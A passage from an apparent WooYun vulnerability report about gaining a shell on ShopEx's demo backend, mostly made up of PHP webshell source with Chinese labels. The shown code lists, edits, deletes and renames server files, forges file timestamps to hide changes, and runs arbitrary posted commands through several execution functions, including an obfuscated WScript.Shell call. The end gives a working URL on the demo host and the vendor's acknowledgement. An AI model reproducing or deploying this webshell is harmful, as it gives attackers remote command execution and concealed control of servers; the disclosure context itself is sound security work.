	echo ($a==&#039;0&#039;) ? &quot;删除注册表健值成功!&quot; : &quot;删除 &quot;.$_POST[&#039;delregname&#039;].&quot; 失败!&quot;;<br />
}<br />
<br />
<br />
echo &quot;&lt;/b&gt;&lt;/p&gt;\n&quot;;<br />
/*===================== 执行操作 结束 =====================*/<br />
<br />
if (!isset($_GET[&#039;action&#039;]) OR empty($_GET[&#039;action&#039;]) OR ($_GET[&#039;action&#039;] == &quot;dir&quot;)) {<br />
	$tb-&gt;tableheader();<br />
?&gt;<br />
  &lt;tr bgcolor=&quot;#cccccc&quot;&gt;<br />
    &lt;td align=&quot;center&quot; nowrap width=&quot;27%&quot;&gt;&lt;b&gt;文件&lt;/b&gt;&lt;/td&gt;<br />
	&lt;td align=&quot;center&quot; nowrap width=&quot;16%&quot;&gt;&lt;b&gt;创建日期&lt;/b&gt;&lt;/td&gt;<br />
    &lt;td align=&quot;center&quot; nowrap width=&quot;16%&quot;&gt;&lt;b&gt;最后修改&lt;/b&gt;&lt;/td&gt;<br />
    &lt;td align=&quot;center&quot; nowrap width=&quot;11%&quot;&gt;&lt;b&gt;大小&lt;/b&gt;&lt;/td&gt;<br />
    &lt;td align=&quot;center&quot; nowrap width=&quot;6%&quot;&gt;&lt;b&gt;属性&lt;/b&gt;&lt;/td&gt;<br />
    &lt;td align=&quot;center&quot; nowrap width=&quot;24%&quot;&gt;&lt;b&gt;操作&lt;/b&gt;&lt;/td&gt;<br />
  &lt;/tr&gt;<br />
&lt;?php<br />
// 目录列表<br />
$dirs=@opendir($dir);<br />
$dir_i = &#039;0&#039;;<br />
while ($file=@readdir($dirs)) {<br />
	$filepath=&quot;$dir/$file&quot;;<br />
	$a=@is_dir($filepath);<br />
	if($a==&quot;1&quot;){<br />
		if($file!=&quot;..&quot; &amp;&amp; $file!=&quot;.&quot;)	{<br />
			$ctime=@date(&quot;Y-m-d H:i:s&quot;,@filectime($filepath));<br />
			$mtime=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($filepath));<br />
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);<br />
			echo &quot;&lt;tr class=&quot;.getrowbg().&quot;&gt;\n&quot;;<br />
			echo &quot;  &lt;td style=\&quot;padding-left: 5px;\&quot;&gt;[&lt;a href=\&quot;?dir=&quot;.urlencode($dir).&quot;/&quot;.urlencode($file).&quot;\&quot;&gt;&lt;font color=\&quot;#006699\&quot;&gt;$file&lt;/font&gt;&lt;/a&gt;]&lt;/td&gt;\n&quot;;<br />
			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$ctime&lt;/td&gt;\n&quot;;<br />
			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$mtime&lt;/td&gt;\n&quot;;<br />
			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;dir&gt;&lt;/td&gt;\n&quot;;<br />
			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;a href=\&quot;?action=fileperm&amp;dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.urlencode($file).&quot;\&quot;&gt;$dirperm&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap&gt;| &lt;a href=\&quot;#\&quot; onclick=\&quot;really(&#039;&quot;.urlencode($dir).&quot;&#039;,&#039;&quot;.urlencode($file).&quot;&#039;,&#039;你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!&#039;,&#039;1&#039;)\&quot;&gt;删除&lt;/a&gt; | &lt;a href=\&quot;?action=rename&amp;dir=&quot;.urlencode($dir).&quot;&amp;fname=&quot;.urlencode($file).&quot;\&quot;&gt;改名&lt;/a&gt; |&lt;/td&gt;\n&quot;;<br />
			echo &quot;&lt;/tr&gt;\n&quot;;<br />
			$dir_i++;<br />
		} else {<br />
			if($file==&quot;..&quot;) {<br />
				echo &quot;&lt;tr class=&quot;.getrowbg().&quot;&gt;\n&quot;;<br />
				echo &quot;  &lt;td nowrap colspan=\&quot;6\&quot; style=\&quot;padding-left: 5px;\&quot;&gt;&lt;a href=\&quot;?dir=&quot;.urlencode($dir).&quot;/&quot;.urlencode($file).&quot;\&quot;&gt;返回上级目录&lt;/a&gt;&quot;.$copyurl.$serveru.&quot;&amp;p=&quot;.$serverp.$copyurll.&quot;&lt;/td&gt;\n&quot;;<br />
				echo &quot;&lt;/tr&gt;\n&quot;;<br />
			}<br />
		}<br />
	}<br />
}// while<br />
@closedir($dirs); <br />
?&gt;<br />
&lt;tr bgcolor=&quot;#cccccc&quot;&gt;<br />
  &lt;td colspan=&quot;6&quot; height=&quot;5&quot;&gt;&lt;/td&gt;<br />
&lt;/tr&gt;<br />
&lt;FORM action=&quot;&quot; method=&quot;POST&quot;&gt;<br />
&lt;?<br />
// 文件列表<br />
$dirs=@opendir($dir);<br />
$file_i = &#039;0&#039;;<br />
while ($file=@readdir($dirs)) {<br />
	$filepath=&quot;$dir/$file&quot;;<br />
	$a=@is_dir($filepath);<br />
	if($a==&quot;0&quot;){		<br />
		$size=@filesize($filepath);<br />
		$size=$size/1024 ;<br />
		$size= @number_format($size, 3);<br />
		if (@filectime($filepath) == @filemtime($filepath)) {<br />
			$ctime=@date(&quot;Y-m-d H:i:s&quot;,@filectime($filepath));<br />
			$mtime=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($filepath));<br />
		} else {<br />
			$ctime=&quot;&lt;span class=\&quot;redfont\&quot;&gt;&quot;.@date(&quot;Y-m-d H:i:s&quot;,@filectime($filepath)).&quot;&lt;/span&gt;&quot;;<br />
			$mtime=&quot;&lt;span class=\&quot;redfont\&quot;&gt;&quot;.@date(&quot;Y-m-d H:i:s&quot;,@filemtime($filepath)).&quot;&lt;/span&gt;&quot;;<br />
		}<br />
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);<br />
		echo &quot;&lt;tr class=&quot;.getrowbg().&quot;&gt;\n&quot;;<br />
		echo &quot;  &lt;td style=\&quot;padding-left: 5px;\&quot;&gt;&quot;;<br />
		echo &quot;&lt;INPUT type=checkbox value=1 name=dl[$filepath]&gt;&quot;;<br />
		echo &quot;&lt;a href=\&quot;$filepath\&quot; target=\&quot;_blank\&quot;&gt;$file&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$ctime&lt;/td&gt;\n&quot;;<br />
		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$mtime&lt;/td&gt;\n&quot;;<br />
		echo &quot;  &lt;td align=\&quot;right\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;span class=\&quot;redfont\&quot;&gt;$size&lt;/span&gt; KB&lt;/td&gt;\n&quot;;<br />
		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;a href=\&quot;?action=fileperm&amp;dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.urlencode($file).&quot;\&quot;&gt;$fileperm&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap&gt;&lt;a href=\&quot;?downfile=&quot;.urlencode($filepath).&quot;\&quot;&gt;下载&lt;/a&gt; | &lt;a href=\&quot;?action=editfile&amp;dir=&quot;.urlencode($dir).&quot;&amp;editfile=&quot;.urlencode($file).&quot;\&quot;&gt;编辑&lt;/a&gt; | &lt;a href=\&quot;#\&quot; onclick=\&quot;really(&#039;&quot;.urlencode($dir).&quot;&#039;,&#039;&quot;.urlencode($filepath).&quot;&#039;,&#039;你确定要删除 $file 文件吗?&#039;,&#039;2&#039;)\&quot;&gt;删除&lt;/a&gt; | &lt;a href=\&quot;?action=rename&amp;dir=&quot;.urlencode($dir).&quot;&amp;fname=&quot;.urlencode($filepath).&quot;\&quot;&gt;改名&lt;/a&gt; | &lt;a href=\&quot;?action=newtime&amp;dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.urlencode($filepath).&quot;\&quot;&gt;时间&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
		echo &quot;&lt;/tr&gt;\n&quot;;<br />
		$file_i++;<br />
	}<br />
}// while<br />
@closedir($dirs); <br />
$tb-&gt;tdbody(&#039;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; align=&quot;center&quot;&gt;&lt;tr&gt;&lt;td&gt;&#039;.$tb-&gt;makeinput(&#039;chkall&#039;,&#039;on&#039;,&#039;onclick=&quot;CheckAll(this.form)&quot;&#039;,&#039;checkbox&#039;,&#039;30&#039;,&#039;&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;downrar&#039;,&#039;选中文件打包下载&#039;,&#039;&#039;,&#039;submit&#039;).&#039;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&#039;.$dir_i.&#039; 个目录 / &#039;.$file_i.&#039; 个文件&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#039;,&#039;center&#039;,getrowbg(),&#039;&#039;,&#039;&#039;,&#039;6&#039;);<br />
<br />
echo &quot;&lt;/FORM&gt;\n&quot;;<br />
echo &quot;&lt;/table&gt;\n&quot;;<br />
}// end dir<br />
<br />
elseif ($_GET[&#039;action&#039;] == &quot;editfile&quot;) {<br />
	if(empty($newfile)) {<br />
		$filename=&quot;$dir/$editfile&quot;;<br />
		$fp=@fopen($filename,&quot;r&quot;);<br />
		$contents=@fread($fp, filesize($filename));<br />
		@fclose($fp);<br />
		$contents=htmlspecialchars($contents);<br />
	}else{<br />
		$editfile=$newfile;<br />
		$filename = &quot;$dir/$editfile&quot;;<br />
	}<br />
	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&amp;editfile=&quot;.$editfile;<br />
	$tb-&gt;tableheader();<br />
	$tb-&gt;formheader($action,&#039;新建/编辑文件&#039;);<br />
	$tb-&gt;tdbody(&#039;当前文件: &#039;.$tb-&gt;makeinput(&#039;editfilename&#039;,$filename).&#039; 输入新文件名则建立新文件 Php代码加密: &lt;input type=&quot;checkbox&quot; name=&quot;change&quot; value=&quot;yes&quot; onclick=&quot;javascript:alert(\&#039;这个功能只可以用来加密或是压缩完整的php代码。\\n\\n非php代码或不完整php代码或不支持gzinflate函数请不要使用！\&#039;)&quot;&gt; &#039;);<br />
	$tb-&gt;tdbody($tb-&gt;maketextarea(&#039;filecontent&#039;,$contents));<br />
	$tb-&gt;makehidden(&#039;do&#039;,&#039;doeditfile&#039;);<br />
	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
}//end editfile<br />
<br />
elseif ($_GET[&#039;action&#039;] == &quot;rename&quot;) {<br />
	$nowfile = (isset($_POST[&#039;newname&#039;])) ? $_POST[&#039;newname&#039;] : basename($_GET[&#039;fname&#039;]);<br />
	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&amp;fname=&quot;.urlencode($fname);<br />
	$tb-&gt;tableheader();<br />
	$tb-&gt;formheader($action,&#039;修改文件名&#039;);<br />
	$tb-&gt;makehidden(&#039;oldname&#039;,$dir.&quot;/&quot;.$nowfile);<br />
	$tb-&gt;makehidden(&#039;dir&#039;,$dir);<br />
	$tb-&gt;tdbody(&#039;当前文件名: &#039;.basename($nowfile));<br />
	$tb-&gt;tdbody(&#039;改名为: &#039;.$tb-&gt;makeinput(&#039;newname&#039;));<br />
	$tb-&gt;makehidden(&#039;do&#039;,&#039;rename&#039;);<br />
	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
}//end rename<br />
<br />
elseif ($_GET[&#039;action&#039;] == &quot;eval&quot;) {<br />
	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&quot;;<br />
	$tb-&gt;tableheader();<br />
	$tb-&gt;formheader(&#039;&#039;.$action.&#039; &quot;target=&quot;_blank&#039; ,&#039;执行php脚本&#039;);<br />
	$tb-&gt;tdbody($tb-&gt;maketextarea(&#039;phpcode&#039;,$contents));<br />
	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
	<br />
}<br />
elseif ($_GET[&#039;action&#039;] == &quot;fileperm&quot;) {<br />
	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.$file;<br />
	$tb-&gt;tableheader();<br />
	$tb-&gt;formheader($action,&#039;修改文件属性&#039;);<br />
	$tb-&gt;tdbody(&#039;修改 &#039;.$file.&#039; 的属性为: &#039;.$tb-&gt;makeinput(&#039;fileperm&#039;,substr(base_convert(fileperms($dir.&#039;/&#039;.$file),10,8),-4)));<br />
	$tb-&gt;makehidden(&#039;file&#039;,$file);<br />
	$tb-&gt;makehidden(&#039;dir&#039;,urlencode($dir));<br />
	$tb-&gt;makehidden(&#039;do&#039;,&#039;editfileperm&#039;);<br />
	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
}//end fileperm<br />
<br />
elseif ($_GET[&#039;action&#039;] == &quot;newtime&quot;) {<br />
	$action = &quot;?dir=&quot;.urlencode($dir);<br />
	$cachemonth = array(&#039;January&#039;=&gt;1,&#039;February&#039;=&gt;2,&#039;March&#039;=&gt;3,&#039;April&#039;=&gt;4,&#039;May&#039;=&gt;5,&#039;June&#039;=&gt;6,&#039;July&#039;=&gt;7,&#039;August&#039;=&gt;8,&#039;September&#039;=&gt;9,&#039;October&#039;=&gt;10,&#039;November&#039;=&gt;11,&#039;December&#039;=&gt;12);<br />
	$tb-&gt;tableheader();<br />
	$tb-&gt;formheader($action,&#039;克隆文件最后修改时间&#039;);<br />
	$tb-&gt;tdbody(&quot;修改文件: &quot;.$tb-&gt;makeinput(&#039;curfile&#039;,$file,&#039;readonly&#039;).&quot; → 目标文件: &quot;.$tb-&gt;makeinput(&#039;tarfile&#039;,&#039;需填完整路径及文件名&#039;),&#039;center&#039;,&#039;2&#039;,&#039;30&#039;);<br />
	$tb-&gt;makehidden(&#039;do&#039;,&#039;domodtime&#039;);<br />
	$tb-&gt;formfooter(&#039;&#039;,&#039;30&#039;);<br />
	$tb-&gt;formheader($action,&#039;自定义文件最后修改时间&#039;);<br />
	$tb-&gt;tdbody(&#039;&lt;br&gt;&lt;ul&gt;&lt;li&gt;有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07&lt;br&gt;(该日期根据 32 位有符号整数的最小值和最大值而来)&lt;/li&gt;&lt;li&gt;说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!&lt;/li&gt;&lt;/ul&gt;&#039;,&#039;left&#039;);<br />
	$tb-&gt;tdbody(&#039;当前文件名: &#039;.$file);<br />
	$tb-&gt;makehidden(&#039;curfile&#039;,$file);<br />
	$tb-&gt;tdbody(&#039;修改为: &#039;.$tb-&gt;makeinput(&#039;year&#039;,&#039;1984&#039;,&#039;&#039;,&#039;text&#039;,&#039;4&#039;).&#039; 年 &#039;.$tb-&gt;makeselect(array(&#039;name&#039;=&gt;&#039;month&#039;,&#039;option&#039;=&gt;$cachemonth,&#039;selected&#039;=&gt;&#039;October&#039;)).&#039; 月 &#039;.$tb-&gt;makeinput(&#039;data&#039;,&#039;18&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 日 &#039;.$tb-&gt;makeinput(&#039;hour&#039;,&#039;20&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 时 &#039;.$tb-&gt;makeinput(&#039;minute&#039;,&#039;00&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 分 &#039;.$tb-&gt;makeinput(&#039;second&#039;,&#039;00&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 秒&#039;,&#039;center&#039;,&#039;2&#039;,&#039;30&#039;);<br />
	$tb-&gt;makehidden(&#039;do&#039;,&#039;modmytime&#039;);<br />
	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
}//end newtime<br />
<br />
elseif ($_GET[&#039;action&#039;] == &quot;shell&quot;) {<br />
	$action = &quot;??action=shell&amp;dir=&quot;.urlencode($dir);<br />
	$tb-&gt;tableheader();<br />
	$tb-&gt;tdheader(&#039;WebShell Mode&#039;);<br />
  if (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) {<br />
		$program = isset($_POST[&#039;program&#039;]) ? $_POST[&#039;program&#039;] : &quot;c:\winnt\system32\cmd.exe&quot;;<br />
		$prog = isset($_POST[&#039;prog&#039;]) ? $_POST[&#039;prog&#039;] : &quot;/c net start &gt; &quot;.$pathname.&quot;/log.txt&quot;;<br />
		echo &quot;&lt;form action=\&quot;?action=shell&amp;dir=&quot;.urlencode($dir).&quot;\&quot; method=\&quot;POST\&quot;&gt;\n&quot;;<br />
		$tb-&gt;tdbody(&#039;无回显运行程序 → 文件: &#039;.$tb-&gt;makeinput(&#039;program&#039;,$program).&#039; 参数: &#039;.$tb-&gt;makeinput(&#039;prog&#039;,$prog,&#039;&#039;,&#039;text&#039;,&#039;40&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;&#039;,&#039;Run&#039;,&#039;&#039;,&#039;submit&#039;),&#039;center&#039;,&#039;2&#039;,&#039;35&#039;);<br />
		$tb-&gt;makehidden(&#039;do&#039;,&#039;programrun&#039;);<br />
		echo &quot;&quot;.$copyurl.$serveru.&quot;&amp;p=&quot;.$serverp.$copyurll.&quot;&lt;/form&gt;\n&quot;;<br />
	}<br />
 echo &quot;&lt;form action=\&quot;?action=shell&amp;dir=&quot;.urlencode($dir).&quot;\&quot; method=\&quot;POST\&quot;&gt;\n&quot;;<br />
 if(isset($_POST[&#039;cmd&#039;])) $cmd = $_POST[&#039;cmd&#039;];<br />
	$tb-&gt;tdbody(&#039;提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容. &#039;);<br />
	$tb-&gt;tdbody(&#039;proc_open函数假设不是默认的winnt系统请自行设置使用,自行修改记得写退出,否则会在主机上留下一个未结束的进程.&#039;);<br />
	$tb-&gt;tdbody(&#039;proc_open函数要使用的cmd程序的位置:&#039;.$tb-&gt;makeinput(&#039;cmd&#039;,$cmd,&#039;&#039;,&#039;text&#039;,&#039;30&#039;).&#039;(要是是linux系统还是大大们自己修改吧)&#039;);<br />
   $execfuncs = (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) ? array(&#039;system&#039;=&gt;&#039;system&#039;,&#039;passthru&#039;=&gt;&#039;passthru&#039;,&#039;exec&#039;=&gt;&#039;exec&#039;,&#039;shell_exec&#039;=&gt;&#039;shell_exec&#039;,&#039;popen&#039;=&gt;&#039;popen&#039;,&#039;wscript&#039;=&gt;&#039;Wscript.Shell&#039;,&#039;proc_open&#039;=&gt;&#039;proc_open&#039;) : array(&#039;system&#039;=&gt;&#039;system&#039;,&#039;passthru&#039;=&gt;&#039;passthru&#039;,&#039;exec&#039;=&gt;&#039;exec&#039;,&#039;shell_exec&#039;=&gt;&#039;shell_exec&#039;,&#039;popen&#039;=&gt;&#039;popen&#039;,&#039;proc_open&#039;=&gt;&#039;proc_open&#039;);<br />
   $tb-&gt;tdbody(&#039;选择执行函数: &#039;.$tb-&gt;makeselect(array(&#039;name&#039;=&gt;&#039;execfunc&#039;,&#039;option&#039;=&gt;$execfuncs,&#039;selected&#039;=&gt;$execfunc)).&#039; 输入命令: &#039;.$tb-&gt;makeinput(&#039;command&#039;,$_POST[&#039;command&#039;],&#039;&#039;,&#039;text&#039;,&#039;60&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;&#039;,&#039;Run&#039;,&#039;&#039;,&#039;submit&#039;));<br />
?&gt;<br />
  &lt;tr class=&quot;secondalt&quot;&gt;<br />
    &lt;td align=&quot;center&quot;&gt;&lt;textarea name=&quot;textarea&quot; cols=&quot;100&quot; rows=&quot;25&quot; readonly&gt;&lt;?php<br />
	if (!empty($_POST[&#039;command&#039;])) {<br />
		if ($execfunc==&quot;system&quot;) {<br />
			system($_POST[&#039;command&#039;]);<br />
		} elseif ($execfunc==&quot;passthru&quot;) {<br />
			passthru($_POST[&#039;command&#039;]);<br />
		} elseif ($execfunc==&quot;exec&quot;) {<br />
			$result = exec($_POST[&#039;command&#039;]);<br />
			echo $result;<br />
		} elseif ($execfunc==&quot;shell_exec&quot;) {<br />
			$result=shell_exec($_POST[&#039;command&#039;]);<br />
			echo $result;	<br />
		} elseif ($execfunc==&quot;popen&quot;) {<br />
			$pp = popen($_POST[&#039;command&#039;], &#039;r&#039;);<br />
			$read = fread($pp, 2096);<br />
			echo $read;<br />
			pclose($pp);<br />
		} elseif ($execfunc==&quot;wscript&quot;) {<br />
			$wsh = new COM(&#039;W&#039;.&#039;Scr&#039;.&#039;ip&#039;.&#039;t.she&#039;.&#039;ll&#039;) or die(&quot;PHP Create COM WSHSHELL failed&quot;);<br />
			$exec = $wsh-&gt;exec (&quot;cm&quot;.&quot;d.e&quot;.&quot;xe /c &quot;.$_POST[&#039;command&#039;].&quot;&quot;);<br />
			$stdout = $exec-&gt;StdOut();<br />
			$stroutput = $stdout-&gt;ReadAll();<br />
			echo $stroutput;<br />
		} elseif($execfunc==&quot;proc_open&quot;){<br />
$descriptorspec = array(<br />
   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),<br />
   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),<br />
   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)<br />
);<br />
$process = proc_open(&quot;&quot;.$_POST[&#039;cmd&#039;].&quot;&quot;, $descriptorspec, $pipes);<br />
if (is_resource($process)) {<br />
<br />
    // 写命令<br />
    fwrite($pipes[0], &quot;&quot;.$_POST[&#039;command&#039;].&quot;\r\n&quot;);<br />
    fwrite($pipes[0], &quot;exit\r\n&quot;);<br />
    fclose($pipes[0]);<br />
    // 读取输出<br />
    while (!feof($pipes[1])) {<br />
        echo fgets($pipes[1], 1024);<br />
    }<br />
    fclose($pipes[1]);<br />
    while (!feof($pipes[2])) {<br />
        echo fgets($pipes[2], 1024);<br />
      }<br />
    fclose($pipes[2]);<br />
<br />
    proc_close($process);<br />
}<br />
		} else {<br />
			system($_POST[&#039;command&#039;]);<br />
		}<br />
	}<br />
?&gt;</code></pre><p class='detail'><br />
<br />
<br />
<br />
在编辑文件的部分可以得到地址形式如下<br />
<br />
</p><pre><code>$_POST[&#039;do&#039;] == &#039;doeditfile&#039;</code></pre><p class='detail'><br />
<br />
查看本地shopex文件，构造如下地址：<br />
<br />
http://demo.shopex.com.cn/485app/sql.php?action=editfile&amp;dir=.%2F%2Fcore%2Finclude_v5&amp;editfile=setmgr.php<br />
<br />
顺利读取并可编辑保存。 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/03094543d3f4f49833db0b5d7f3cbae6c831c919.jpg" target="_blank"><img src="../images/03094543d3f4f49833db0b5d7f3cbae6c831c919.jpg" alt="485.jpg" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">权限，还是权限。。。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lucifer" title="lucifer">lucifer</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015536" title="shopex官方演示后台得到shell与任意文件遍历突破">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：中</p>
						<p class="detail">漏洞Rank：5 </p>
													<p class="detail">确认时间：2012-12-03 22:30</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
我们将尽快修复<br />
非常感谢</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="15536";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
